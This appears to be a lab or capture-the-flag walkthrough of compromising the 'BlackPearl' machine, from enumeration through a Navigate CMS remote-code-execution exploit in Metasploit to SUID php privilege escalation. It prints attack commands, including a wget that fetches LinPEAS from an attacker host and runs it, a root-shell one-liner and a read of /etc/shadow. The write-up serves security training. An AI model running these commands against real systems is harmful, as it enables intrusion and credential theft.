# BlackPearl – Proof of Concept Walkthrough

## Objective

This lab demonstrates the importance of adaptability, persistence, and creative problem-solving in offensive security.

Security weaknesses are not always obvious. Sometimes exploitation requires:

* Testing multiple attack paths
* Pivoting between services
* Identifying misconfigurations
* Leveraging seemingly minor oversights

A single careless mistake — such as an exposed file, improper DNS configuration, or misconfigured SUID binary — can result in full system compromise.

This walkthrough documents the complete attack chain from enumeration to root access.

---

# 1. Initial Enumeration

A full TCP scan was conducted against the target:

```bash
nmap -sC -sV <target-ip>
```

### Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5
80/tcp open  http    nginx 1.14.2
```

Key observations:

* SSH running on port 22 (not immediately exploitable)
* DNS service exposed on port 53
* HTTP service running nginx 1.14.2
* Default nginx landing page exposed

The presence of a default web server page indicates poor hygiene and possible misconfiguration.

---

# 2. Web Enumeration (Port 80)

Navigating to:

```
http://<target-ip>
```

Displayed the default nginx page.

* screenshots/01-default-nginx-welcome-page.png

---

## Directory Brute Forcing

Using `ffuf` for directory discovery:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<target-ip>/FUZZ
```

Only one directory was discovered:

```
/secret
```

Visiting it downloaded a text file named `secret`.

* screenshots/02-scret.png

The file did not provide useful information for exploitation.

---

# 3. DNS Enumeration (Port 53)

Since DNS (port 53) was exposed, further investigation was performed.

A reverse DNS lookup was conducted using `dnsrecon`:

```bash
dnsrecon -r 127.0.0.0/24 -n <target-ip> -d placeholder
```

A PTR record was discovered.

* screenshots/03-dnsrecon.png

---

## Editing /etc/hosts

To properly resolve the discovered domain locally, an entry was added to the attacker machine:

```bash
sudo nano /etc/hosts
```

Added:

```
<target-ip> blackpearl.tcm
```

This ensures the domain resolves locally without relying on external DNS.

* screenshots/04-etc-host-edit.png

---

# 4. Virtual Host Discovery

Navigating to:

```
http://blackpearl.tcm
```

Produced a different page than the IP address.

* screenshots/05-blackpearl-tcm.png

This confirmed the use of **virtual host routing**, meaning content is served based on hostname rather than IP.

---

## Directory Enumeration (Again – Now Using Domain)

Re-running `ffuf` using the domain:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://blackpearl.tcm/FUZZ
```

Discovered:

```
/navigate
```

Navigating to:

```
http://blackpearl.tcm/navigate
```

Revealed a CMS login page.

* screenshots/06-blackpearl-navigate.png

---

# 5. CMS Identification & Exploitation

The application was identified as:

**Navigate CMS v2.8**

A search for known vulnerabilities revealed a **Remote Code Execution (RCE)** vulnerability.

Exploitation was performed using Metasploit.

---

## Exploitation via Metasploit

```bash
msfconsole
use exploit/multi/http/navigate_cms_rce
show targets
set TARGET <id>
set RHOSTS <target-ip>
set VHOST blackpearl.tcm
exploit
```

Successful exploitation resulted in a shell as:

```
www-data
```

* screenshots/07-metasploit-gain-lower-privilege-access.png

---

# 6. Shell Stabilization

The initial shell was non-interactive.

Python was used to spawn a proper TTY:

```bash
which python

python -c 'import pty; pty.spawn("/bin/bash")'
```

---

# 7. Privilege Escalation Enumeration

The tool **LinPEAS** was used for local enumeration.

On attacker machine:

```bash
python3 -m http.server 81
```

On target machine:

```bash
wget http://<attacker-ip>:81/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

* screenshots/08-spwn-shshell-upload-linepeas.png
* screenshots/09-python-serveup-linpeas.png
* screenshots/10-linpeas-uploaded.png
* screenshots/11-chmod-run-linpeas.png

---

# 8. SUID Discovery

LinPEAS highlighted SUID binaries.

* screenshots/12-linpeas-scan-suid-sgid.png

Manual confirmation:

```bash
find / -type f -perm -4000 2>/dev/null
```

* screenshots/13-linpeas-find.png

---

## Understanding SUID

When a binary has the SUID bit set (`-rwsr-xr-x`), it runs with the file owner's privileges (often root).

However, not all SUID binaries are exploitable. Each must be analyzed individually.

---

# 9. GTFOBins Research

The identified SUID binary:

```
/usr/bin/php7.3
```

Was cross-referenced against **GTFOBins**, which provides privilege escalation techniques for misconfigured binaries.

* screenshots/14-gtfobins-website.png
* screenshots/15-gtfobins-website2.png
* screenshots/16-linpeas-find2.png

---

# 10. Privilege Escalation to Root

The following command was executed:

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

This spawns a root shell due to the SUID bit.

* screenshots/17-gain-root-acess-shell.png

---

# 11. Proof of Root Access

To confirm full compromise:

```bash
cat /etc/shadow
```

Access to `/etc/shadow` confirms root privileges.

* screenshots/18-etc-shadow-file.png

---

# Final Summary

This machine demonstrates several important offensive security lessons:

* Default configurations expose attack surface.
* DNS misconfiguration can reveal hidden virtual hosts.
* Virtual host routing requires hostname enumeration.
* Public CMS software often contains known vulnerabilities.
* SUID binaries must always be reviewed.
* GTFOBins is invaluable for privilege escalation research.
* A single misconfigured binary can result in full root compromise.

---

# Key Takeaways

Security is rarely broken by a single catastrophic failure.
It is often broken by:

* Misconfiguration
* Poor hygiene
* Forgotten files
* Exposed services
* Unpatched software

Every step in system configuration should be deliberate and precise.
Small mistakes can lead to total compromise.

---
